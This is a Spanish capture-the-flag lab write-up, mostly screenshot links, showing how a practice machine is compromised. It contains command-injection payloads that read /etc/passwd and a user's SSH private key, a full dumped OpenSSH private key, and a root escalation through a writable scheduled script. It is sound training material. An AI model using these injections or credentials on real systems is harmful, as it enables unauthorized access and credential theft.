- --
- Tags: #ejptmachine #rce 
---

![Pasted image 20250125180808](../../Fotos/Pasted%20image%2020250125180808.png)

![Pasted image 20250125180848](../../Fotos/Pasted%20image%2020250125180848.png)

![Pasted image 20250125180954](../../Fotos/Pasted%20image%2020250125180954.png)

![Pasted image 20250125181149](../../Fotos/Pasted%20image%2020250125181149.png)

![Pasted image 20250125181205](../../Fotos/Pasted%20image%2020250125181205.png)

![Pasted image 20250125181227](../../Fotos/Pasted%20image%2020250125181227.png)

![Pasted image 20250125181414](../../Fotos/Pasted%20image%2020250125181414.png)

No nos aparece en el uploads.php y revisando con burpsuite tenemos error

![Pasted image 20250125182226](../../Fotos/Pasted%20image%2020250125182226.png)

Con fuerza bruta no tenemos resultados asique intentaremos con el panel de generar reportes
- Intentaremos escapar comandos 

![Pasted image 20250125182341](../../Fotos/Pasted%20image%2020250125182341.png)

`;cat /etc/passwd`

![Pasted image 20250125182513](../../Fotos/Pasted%20image%2020250125182513.png)

- Usuario samara

`;ls /home/samara`

![Pasted image 20250125183042](../../Fotos/Pasted%20image%2020250125183042.png)

`;cat /home/samara/user.txt`

![Pasted image 20250125183208](../../Fotos/Pasted%20image%2020250125183208.png)

- Sin permisos para leer y el otro archivo message.txt dice no tienes permitido estar aqui solamente.

`;cat /home/samara/.ssh/id_rsa`

![Pasted image 20250125183300](../../Fotos/Pasted%20image%2020250125183300.png)


```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

![Pasted image 20250125183429](../../Fotos/Pasted%20image%2020250125183429.png)

![Pasted image 20250125183526](../../Fotos/Pasted%20image%2020250125183526.png)

*Aquí hay dos maneras de hacer esto, investigando sencillamente con ps faux o manualmente o ya tirar de script como PSPY (hace casi lo mismo que ps faux tal vez tenga distinciones pero lo desconozco hasta el momento) que analiza todos los procesos que se ejecutan en el sistema*

![Pasted image 20250125184145](../../Fotos/Pasted%20image%2020250125184145.png)

- /usr/local/bin/echo.sh

Esto es lo que sale en el archivo de texto en el directorio home de samara por ende el que manda la orden proviene de este script encontrado por ende si lo modificamos ya que tenemos permisos de escritura apodemos escalar fácilmente a root

![Pasted image 20250125184212](../../Fotos/Pasted%20image%2020250125184212.png)

![Pasted image 20250125184325](../../Fotos/Pasted%20image%2020250125184325.png)

![Pasted image 20250125184621](../../Fotos/Pasted%20image%2020250125184621.png)

![Pasted image 20250125184644](../../Fotos/Pasted%20image%2020250125184644.png)

![Pasted image 20250125184927](../../Fotos/Pasted%20image%2020250125184927.png)

